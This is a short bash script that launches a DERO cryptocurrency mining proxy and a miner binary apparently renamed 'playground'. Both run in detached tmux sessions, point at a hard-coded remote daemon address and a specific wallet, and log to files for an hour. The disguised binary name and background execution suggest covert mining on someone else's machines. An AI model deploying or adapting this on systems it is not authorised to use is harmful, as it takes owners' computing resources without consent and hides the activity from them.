#!/bin/bash
chmod 500 playground && tmux new -d './derohe-proxy --listen-address=127.0.0.1:11111 --log-interval=60 --nonce --daemon-address=178.62.28.214:10101 > output.log'
chmod 500 playground && tmux new -d './playground -w dero1qyxeam6g2kszcre09kpkhr9swgt560cyts3pfaa60q27ephl2a84qqqf9s2xk -r 127.0.0.1:11111 -p rpc > out.log'
sleep 3600
